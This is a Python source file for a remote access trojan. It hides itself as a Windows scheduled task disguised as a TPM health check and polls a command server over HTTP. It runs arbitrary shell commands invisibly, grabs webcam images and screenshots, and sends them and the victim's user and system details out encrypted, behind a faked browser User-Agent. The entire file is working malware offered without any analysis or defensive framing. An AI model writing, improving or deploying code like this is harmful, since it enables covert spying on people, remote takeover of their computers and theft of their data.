import requests
import time
import cv2
import base64
import sys
import numpy as np
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import random
import string
import secrets
import subprocess
from mss import mss
import os
import platform


WEB_HOOK = "http://127.0.0.1:5000"
PASSWORD = str(''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(8)))
KEY = PASSWORD.encode('utf-8').ljust(16, b'\0')[:16]

def create_stealth_persistence():
    try:
        app_path = os.path.realpath(sys.argv[0])
        task_name = "WindowsTpmHealthCheck"
        
        create_command = f'schtasks /create /tn "{task_name}" /tr "{app_path}" /sc onlogon /rl highest /f'
        
        subprocess.run(
            create_command, 
            shell=True, 
            capture_output=True, 
            creationflags=0x08000000
        )
    except:
        pass
def crypt(data):
    cipher = AES.new(KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(pad(data.encode('utf-8'), AES.block_size))
    combined = cipher.nonce + tag + ciphertext
    return base64.b64encode(combined).decode('utf-8')

def decrypt(data):
    raw_data = base64.b64decode(data.encode('utf-8'))
    nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    return unpad(cipher.decrypt_and_verify(ciphertext, tag), AES.block_size).decode('utf-8')

def send_http(data):
    try: requests.post(WEB_HOOK, data=data.encode('utf-8'), headers={'User-Agent': 'Mozilla/5.0'}, timeout=20)
    except: pass

def recv_http():
    try:
        response = requests.get(WEB_HOOK, headers={'User-Agent': 'Mozilla/5.0'}, timeout=20)
        return response.text
    except: return ""

class DataProto:
    def __init__(self, data):
        self.data = data
        self.pos = 0
    def get(self, number):
        if self.pos + number > len(self.data): raise ValueError("overflow")
        chunk = self.data[self.pos:self.pos + number]
        self.pos += number
        return chunk

def cmd_mode(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=0x08000000)
        result, error = process.communicate()
        output = (result if result else error).decode('utf-8', errors='ignore')
        enc_res = crypt(output)
        send_http(f"0x11{len(str(len(enc_res)))}{len(enc_res)}{enc_res}")
    except Exception as e:
        err = crypt(str(e))
        send_http(f"0x00{len(str(len(err)))}{len(err)}{err}")

def img_mode():
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cam.read()
        cam.release()
        if ret:
            _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
            img_b64 = crypt(base64.b64encode(buffer).decode())
            send_http(f"0x22{len(str(len(img_b64)))}{len(img_b64)}{img_b64}")
    except Exception as e:
        err = crypt(str(e))
        send_http(f"0x00{len(str(len(err)))}{len(err)}{err}")

def scrsh():
    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            frame = np.array(sct_img)
            image = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode(".jpg", image, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            img_enc = crypt(base64.b64encode(buffer).decode('utf-8'))
            l_str = str(len(img_enc))
            send_http(f"0x33{len(l_str)}{l_str}{img_enc}")
    except Exception as e:
        err_msg = crypt(str(e))
        send_http(f"0x00{len(str(len(err_msg)))}{len(err_msg)}{err_msg}")

def process_data(data):
    proto = DataProto(data.strip())
    valid_types = {"0x11", "0x22", "0x33"}
    while proto.pos < len(data):
        try:
            t = proto.get(4)
            if t not in valid_types: break
            l_l = int(proto.get(1))
            l = int(proto.get(l_l))
            msg = decrypt(proto.get(l))
            if t == "0x11": cmd_mode(msg)
            elif t == "0x22": img_mode()
            elif t == "0x33": scrsh()
        except: break

def main():
    create_stealth_persistence()
    sys_info = crypt(f"USER:{os.getlogin()}|OS:{platform.system()} {platform.release()}")
    send_http(f"0xFF{len(str(len(sys_info)))}{len(sys_info)}{sys_info}|{PASSWORD}")
    last_data = ""
    while True:
        try:
            data = recv_http()
            if data and data != last_data:
                last_data = data
                process_data(data)
            time.sleep(random.uniform(5, 10))
        except: time.sleep(30)

if __name__ == "__main__":
    main()